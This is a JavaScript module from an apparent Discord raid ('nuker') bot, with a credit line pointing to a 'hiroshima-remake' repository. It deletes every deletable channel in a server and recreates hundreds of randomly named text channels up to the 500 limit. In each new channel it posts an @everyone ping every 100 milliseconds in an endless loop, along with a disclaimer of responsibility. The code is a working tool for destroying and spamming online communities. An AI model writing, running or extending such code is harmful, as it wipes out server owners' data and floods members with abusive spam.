import logger from "../logging/logger.js";
import pc from "picocolors";
function getRandomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function getRandomEmoji(length) {
  const emojiRanges = [
    [0x1f600, 0x1f64f], // Emoticons
    [0x1f300, 0x1f5ff], // Misc symbols and pictographs
    [0x1f680, 0x1f6ff], // Transport and map symbols
    [0x1f700, 0x1f77f], // Alchemical symbols
    [0x1f900, 0x1f9ff], // Supplemental symbols and pictographs
    [0x1fa70, 0x1faff], // More symbols
  ];
  let result = "";
  for (let i = 0; i < length; i++) {
    const range = emojiRanges[Math.floor(Math.random() * emojiRanges.length)];
    const emojiCode =
      Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
    result += String.fromCodePoint(emojiCode);
  }
  return result;
}
class Channel {
  async deleteAllChannels(guild) {
    try {
      let deletableChannels = guild.channels.cache.filter(
        (channel) => channel.deletable
      );

      if (deletableChannels.size === 0) {
        await logger.warn("No channel available for deletion.");
        console.log(pc.yellow("No deletable channels found."));
        return;
      }

      let deletedChannels = 0;
      for (const channel of deletableChannels.values()) {
        try {
          await logger.info(
            `Attempting to delete channel: '${channel.name}' (id: ${channel.id})`
          );
          console.log(
            pc.yellow(
              `Attempting to delete channel: '${channel.name}' (id: ${channel.id})`
            )
          );

          await channel.delete();
          await logger.info(
            `Deleted channel: '${channel.name}' (${channel.id})`
          );
          console.log(
            pc.green(`Deleted channel: '${channel.name}' (${channel.id})`)
          );
          deletedChannels++;
        } catch (error) {
          await logger.error(
            `Failed to delete '${channel.name}': ${error.message}`
          );
          console.log(pc.red(`Skipping '${channel.name}' due to error.`));
        }
      }

      await logger.info(
        `Channel deletion complete. Total deleted: ${deletedChannels}`
      );
      console.log(
        pc.cyan(
          `Channel deletion finished. Deleted ${deletedChannels} channels.`
        )
      );
    } catch (error) {
      await logger.error(`Error in deleteAllChannels: ${error.message}`);
      console.error(pc.red(`Unexpected error: ${error.message}`));
    }
  }

  async createChannel(guild) {
    try {
      let guildChannelSpace = 500 - guild.channels.cache.size;
      let createdChannelsAmount = 0;
      let createdChannels = [];
      console.log(
        pc.yellow(
          `Attempting to create ${pc.red(guildChannelSpace)} channel...`
        )
      );
      await logger.info(`Attempting to create ${guildChannelSpace} channel...`);
      for (let x = 1; x < guildChannelSpace; x++) {
        const channel = await guild.channels.create({
          name: `${getRandomEmoji(1)}-${getRandomString(98)}`,
          type: 0,
        });

        guildChannelSpace--;
        createdChannelsAmount++;
        createdChannels.push(channel);

        await logger.info(`${x}th Channel created successfully.`);
        console.log(
          pc.green(
            `${x}th Channel created successfully. ${guildChannelSpace} left.`
          )
        );
        this.sendMessages(channel);
      }

      console.log(
        `Channel creation finished. created ${createdChannelsAmount} text channel.`
      );
    } catch (error) {
      await logger.error(`Failed to create channel: ${error.message}`);
      console.log(pc.red(`Error creating channel: ${error.message}`));
    }
  }

  async sendMessages(channel) {
    try {
      while (1) {
        await channel.send(`
# Made By DrowningDev  
- - Discord (user): <@901101714617286686>
- - [Discord (user link)](https://discord.com/users/901101714617286686)
- - [GitHub](https://github.com/drowning14)  
[Source Code](https://github.com/drowning14/hiroshima-remake)  

**Disclaimer: I am not responsible for any issues/problem related to this server/guild.  
Please do not DM me with complaints.**  

||@everyone||
`);
        await new Promise((resolve) => setTimeout(resolve, 100)); // Ensure there's a small delay between messages
      }
    } catch (error) {
      await logger.error(
        `Failed to Send Message Into ${channel.id}: ${error.message}`
      );
      console.log(
        pc.red(`Error sending message into ${channel.id}: ${error.message}`)
      );
    }
  }
}

const ChannelManager = new Channel();
export { ChannelManager, getRandomEmoji, getRandomString };
